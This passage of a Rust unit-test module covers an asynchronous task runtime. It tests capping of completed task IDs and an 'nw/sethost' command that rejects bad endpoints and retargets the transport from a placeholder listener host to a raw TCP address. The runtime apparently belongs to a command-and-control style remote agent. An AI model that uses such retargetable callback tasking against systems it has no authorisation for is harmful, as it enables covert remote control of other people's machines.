        let oldest = Uuid::new_v4();
        runtime.completed.lock().unwrap().insert(oldest);
        let mut newest = oldest;
        for _ in 0..TASK_ID_MEMORY_LIMIT {
            newest = Uuid::new_v4();
            runtime.completed.lock().unwrap().insert(newest);
        }
        let completed = runtime.completed.lock().unwrap();
        assert_eq!(completed.ids.len(), TASK_ID_MEMORY_LIMIT);
        assert!(!completed.contains(&oldest));
        assert!(completed.contains(&newest));
        drop(completed);
        assert_eq!(
            runtime.accepted_task_ids.lock().unwrap().len(),
            TASK_ID_MEMORY_LIMIT
        );
        assert_eq!(accepted.len(), TASK_ID_MEMORY_LIMIT);
    }

    #[tokio::test]
    async fn sethost_rejects_relative_endpoint_without_mutating_runtime() {
        let runtime = Arc::new(runtime());
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/sethost".into(),
            args: vec!["/relative-listener".into()],
            timeout_ms: 0,
        };

        assert!(runtime.accept_task(task.id));
        Arc::clone(&runtime).execute(vec![task.clone()]).await;

        assert_eq!(
            runtime.transport.read().unwrap().describe(),
            "http://listener.example:8081"
        );
        let result = runtime.pending.lock().unwrap().pop().unwrap();
        assert_eq!(result.task_id, task.id);
        assert!(!result.ok);
        assert_eq!(result.exit_code, -1);
        assert!(!result.stderr.is_empty());
    }

    #[tokio::test]
    async fn sethost_rejects_non_http_scheme_without_mutating_runtime() {
        let runtime = Arc::new(runtime());
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/sethost".into(),
            args: vec!["ftp://listener.example:8081".into()],
            timeout_ms: 0,
        };

        assert!(runtime.accept_task(task.id));
        Arc::clone(&runtime).execute(vec![task.clone()]).await;

        assert_eq!(
            runtime.transport.read().unwrap().describe(),
            "http://listener.example:8081"
        );
        let result = runtime.pending.lock().unwrap().pop().unwrap();
        assert_eq!(result.task_id, task.id);
        assert!(!result.ok);
        assert_eq!(result.exit_code, -1);
        assert!(!result.stderr.is_empty());
    }

    #[tokio::test]
    async fn sethost_switches_transport_cleanly() {
        let runtime = Arc::new(runtime());
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/sethost".into(),
            args: vec!["tcp://10.9.9.9:9999".into()],
            timeout_ms: 0,
        };

        assert!(runtime.accept_task(task.id));
        Arc::clone(&runtime).execute(vec![task.clone()]).await;

        assert_eq!(
            runtime.transport.read().unwrap().describe(),
            "tcp://10.9.9.9:9999"
        );
        let result = runtime.pending.lock().unwrap().pop().unwrap();
        assert!(result.ok);
        assert_eq!(result.exit_code, 0);
    }
}
